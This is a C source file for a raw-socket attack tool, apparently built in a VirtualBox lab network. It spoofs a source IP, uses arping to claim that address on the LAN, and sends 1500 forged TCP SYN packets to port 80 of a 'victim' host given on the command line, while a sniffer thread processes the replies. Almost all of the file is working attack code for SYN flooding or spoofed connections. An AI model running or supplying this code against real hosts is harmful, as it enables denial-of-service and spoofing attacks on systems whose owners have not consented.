#include <stdio.h> //standard stuff (printf..)
#include <stdlib.h> //malloc
#include <string.h> //memset
#include <netinet/tcp.h> //declaration for tcp header
#include <netinet/ip.h> //declaration for ip header
#include <pthread.h> //threads
#include <errno.h> //strerr
#include <netdb.h> //NI_MAXHOST, NI_NUMERICHOST
#include <ifaddrs.h> //getifaddrs func
#include <time.h>
#include <signal.h>

#include "handshake.h"
#include "arpinglib.h"

void hostname_toip(char *dst, struct in_addr *dst_ip);
char* get_local_ip();
void start_attack(char *argv[]);
void send_arp(char *argv[]);
void prepare_arping(char *argv[]);

int main(int argc, char *argv[])
{

    /*---------------------------------------
    TODO:

    --figure out a way how to run this program
    as root without running with sudo (qtcreator)
    ideally use setuid() function or something
    like that
    ---------------------------------------*/
    if(argc < 4)
    {
        fprintf(stderr, "Usage: ./raw <Hostname> <Query string> <NIC [eth0, wlan0]>\n");
        return 1;
    }
    struct timeval time;
    gettimeofday(&time, NULL);
    //srand(t1.tv_usec * t1.tv_sec);

    srand((time.tv_sec * 1000) + (time.tv_usec / 1000));

    //srand(time(0));

    char *ip_array[10];

    ip_array[0] = argv[0];
    ip_array[1] = argv[1];
    ip_array[2] = argv[2];
    ip_array[3] = argv[3];
    ip_array[4] = "192.168.56.150";


    pthread_t thread1;

    //Creating thread with start_sniffing() function call, will start receiving packets and process them
    if(pthread_create(&thread1, NULL, (void *) start_sniffing, argv) < 0)
    {
        fprintf(stderr, "Failed to create a new thread.\n");
        return 1;
    }

    char *args[] = {"-q", "-A", "-I", argv[3], "-s", ip_array[4], "192.168.56.101"};
    pthread_t arping_th;

    if(pthread_create(&arping_th, NULL, (void *) prepare_arping, args) < 0)
    {
        fprintf(stderr, "Failed to create a thread for arping.\n");
        exit(-1);
    }
    pthread_detach(arping_th);

    for(int i = 0; i < 1500; i++)
    {
        //sleep(1);
        start_attack(ip_array);
        printf("Thread %d started.\n", i);

        fflush(stdout);
    }

    pthread_join(thread1, NULL);
    //pthread_join(threads[0], NULL);

    return 0;
}

void start_attack(char *argv[])
{
    int sock_raw;

    struct in_addr dst_ip;

    char source_ip[25] = "";
    strcpy(source_ip, argv[4]);
    //printf("-------------------\n");
    //printf("Victim: %s\n", argv[1]);
    //printf("Target of attack: %s\n", argv[2]);
    //printf("Device: %s\n", argv[3]);
    //printf("Source ip: %s\n", source_ip);
    //printf("-------------------\n");

    //For every time rand func is called, be sure to generate different result
    //using rand()/srand() in multithreaded app is unsafe
    //srand(time(NULL));
    //I want source ports to be in range 50000-59999
    u_int16_t seq_n = (rand() % 10000);
    u_int16_t source_port = (rand() % 10000) + 50000;

    //printf("Seq_n: %u and port: %u\n", seq_n, source_port);
    sock_raw = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

    fflush(stdout);
    if(sock_raw < 0)
    {
        perror("Socket error\n");
        exit(-1);
    }
    else
    {
        printf("Socket %d created.\n", sock_raw);
    }

    char *dst;
    dst = argv[1];
    //printf("Got argv[1]: %s\n", argv[1]);

    //If hostname (argv[1]) is specified in numbers-and-dots notation, convert to network byte order
    if(inet_addr(dst) != INADDR_NONE)
    {
        //inet_addr converts dst from numbers-dots notaion to network byte order
        //printf("Directly filling dst_ip.\n");
        dst_ip.s_addr = inet_addr(dst);
    }
    else
    {
        //Calls function hostname_toip which translates hostname to IP
        //printf("Calling addrinfo function, with a host: '%s'\n", dst);
        hostname_toip(dst, &dst_ip);
        //inet_ntoa needs whole in_addr struct
        //printf("Your victim is: %s\n", inet_ntoa(dst_ip));
    }



    //printf("Local ip is: %s\n", source_ip);

    //IP header
    struct ip iph;
    struct tcphdr tcph;
    struct sockaddr_in dest;

    char *packet_to_send;
    packet_to_send = (char *) malloc(60);
    if(packet_to_send == NULL)
    {
        perror("Could not allocate packet_to_send mem on heap.\n");
        exit(-1);
    }

    //Zero out the packet memory area
    bzero(packet_to_send, 60);
    //memset(packet_to_send, 0, 60);
    //Fill in the IP header
    iph.ip_hl = 5;
    iph.ip_v = 4;
    iph.ip_tos = 0;
    iph.ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
    iph.ip_id = htons(12345);
    iph.ip_off = 0;
    iph.ip_ttl = 64;
    iph.ip_p = IPPROTO_TCP;
    iph.ip_sum = 0; //Will be calculated afterwards
    iph.ip_src.s_addr = inet_addr(source_ip);
    iph.ip_dst.s_addr = dst_ip.s_addr;

    //Function that calculates checksum is implemented in trafgen
    iph.ip_sum = csum((unsigned short *) packet_to_send, iph.ip_len >> 1);

    memcpy(packet_to_send, &iph, sizeof(iph));

    //Fill in the TCP header
    tcph.th_sport = htons(source_port);
    tcph.th_dport = htons(80);
    tcph.th_seq = htonl(seq_n);
    tcph.th_ack = 0;
    tcph.th_x2 = 0;
    tcph.th_off = sizeof(struct tcphdr) / 4;
    tcph.th_flags = TH_SYN;
    tcph.th_win = htons(29200);
    tcph.th_sum = 0;
    tcph.th_urp = 0;
    tcph.th_sum = tcp_csum(iph.ip_src.s_addr, iph.ip_dst.s_addr, (unsigned short *)&tcph, sizeof(tcph));

    memcpy((packet_to_send + sizeof(iph)), &tcph, sizeof(tcph));

    int one = 1;

    //IP_HDRINCL tells the kernel that headers are included
    if(setsockopt(sock_raw, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)
    {
        fprintf(stderr, "Error setting up setsockopt!\n");
        perror("Set sock options fail!\n");
        exit(-1);
    }


    //printf("Starting to send packets.\n");

    //dest - sockaddr_in
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = iph.ip_dst.s_addr;

    //Send the packet out
    if(sendto(sock_raw, packet_to_send, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *) &dest, sizeof(struct sockaddr)) < 0)
    {
        fprintf(stderr, "Error sending syn packet! Error message: %s\n", strerror(errno));
        exit(1);
    }
    close(sock_raw);
    free(packet_to_send);
}

void hostname_toip(char *dst, struct in_addr *dst_ip)
{
    struct addrinfo hints, *result;
    int addrinfores = 0;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;

    //printf("Getting addrinfo of: %s\n", dst);

    //Translating hostname to IP
    addrinfores = getaddrinfo(dst, "80", &hints, &result);

    if(addrinfores != 0)
    {
        fprintf(stderr, "Getaddrinfo error: %s\n", strerror(errno));
        exit(0);
    }

    struct sockaddr_in *addr;
    //I can cast sockaddr to sockaddr_in which I need for writing to stdout
    addr = (struct sockaddr_in *) result->ai_addr;

    freeaddrinfo(result);
    //printf("You address: %s\n", inet_ntoa((struct in_addr) addr->sin_addr));

    //ai_addr is a struct in_addr what is the same type as dst_ip
    *dst_ip = addr->sin_addr;

    //I have dst_ip as a pointer here, that's why I need to pass *dst_ip
    //printf("Translated as: %s\n", inet_ntoa(*dst_ip));
}

void prepare_arping(char *argv[])
{
    sleep(2);
    int arg_count = 7;
    //these parameters have to be specified exactly in this order with -q in front
    arping_main(arg_count, argv);
}

/*char* get_local_ip()
{
    char *device, errbuff[PCAP_ERRBUF_SIZE];
    bpf_u_int32 net, mask;
    char *source_ip;
    source_ip = (char *) malloc(20);
    if(source_ip == NULL)
    {
        perror("Could not allocate source_ip mem on heap.\n");
        exit(-1);
    }

    device = pcap_lookupdev(errbuff);
    printf("Your default device is: %s\n", device);

    pcap_lookupnet(device, &net, &mask, errbuff);

    struct ifaddrs *ifaddr, *ifa;
    char host[NI_MAXHOST];
    getifaddrs(&ifaddr);

    for(ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next)
    {
        if(ifa->ifa_addr == NULL)
            continue;
        //min 8 field width between prints, with left alignment '-'
        //printf("%-8s\n", ifa->ifa_name);

        getnameinfo(ifa->ifa_addr, sizeof(struct sockaddr_in), host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);

        if(*(ifa->ifa_name) == *device && ifa->ifa_addr->sa_family==AF_INET)
        {
            //printf("IP: %s\n", host);
            strcpy(source_ip, host);
        }
    }
    return source_ip;

}*/
